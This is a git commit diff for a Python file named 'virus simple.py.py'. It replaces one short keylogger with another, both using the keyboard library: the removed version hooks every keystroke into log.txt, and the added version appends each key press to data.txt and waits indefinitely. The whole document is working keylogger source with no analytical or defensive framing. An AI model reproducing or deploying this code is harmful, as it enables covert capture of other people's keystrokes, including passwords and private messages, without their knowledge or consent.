77af16db926f5fcb4adc58ce5d67b078214f79a6
mateovivas453-dot <mateovivas453@gmail.com>
2025-10-22 20:14:11 -0500

    Update virus simple.py.py

--- virus simple.py.py
+++ virus simple.py.py
@@ -1,9 +1,12 @@
-import keyboard, time, datetime; log_file = "log.txt"
+import keyboard 
 
-open(log_file, 'w').close() 
+def PresionarTecla(key):
 
-keyboard.hook(lambda event: open(log_file, 'a').write(event.name + '\n') if event.event_type == keyboard.KEY_DOWN else None)
-
-print(f"Keylogger simple iniciado. Registrando en: {log_file}")
-while True:
-    time.sleep(10)
+    with open ('data.txt','a') as file :
+        if key.name == 'space':
+            file.write(' ')
+        else:
+            file.write ( key.name)
+keyboard.on_press(PresionarTecla)
+keyboard.wait()
+            
